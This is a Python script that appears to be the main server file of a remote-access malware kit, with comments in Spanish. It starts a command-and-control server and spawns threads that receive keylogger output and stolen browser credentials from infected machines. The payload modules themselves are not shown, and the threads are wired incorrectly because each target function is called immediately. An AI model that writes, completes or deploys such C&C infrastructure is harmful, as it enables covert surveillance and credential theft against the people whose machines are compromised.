import threading
from pathlib import Path
import cmd_cntr
import recv_cred
import colorama
from colorama import Fore
import recv_keys

#
# Autor   ->  an0mal1a
# Name    ->  Pablo
# GitHub  ->  https://github.com/an0mal1a
# Correo  -> pablodiez024@proton.me
#

# Conexion de keylog
# C&C
# Navegadores
# Conexiones cifradas mediante certificado SSL


def banner():
    colorama.init()
    print(Fore.GREEN + "\n\n\t[!] STARTED C&C SERVER\n\t" + Fore.RESET)


def get_user_path():
    return "{}/".format(Path.home())


def main():
    banner()

    # Hilo 1 de keylogs
    thread_1 = threading.Thread(target=recv_keys.main())
    thread_1.start()

    # Hilo 3 de credenciales de navegadores
    thread_2 = threading.Thread(target=recv_cred.main())
    thread_2.start()

    # Hilo 2 comand & control
    thread_3 = threading.Thread(target=cmd_cntr.start())
    thread_3.start()

    # Juntamos los hilos para su posterior detención.
    thread_2.join()
    thread_1.join()
    thread_3.join()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit()
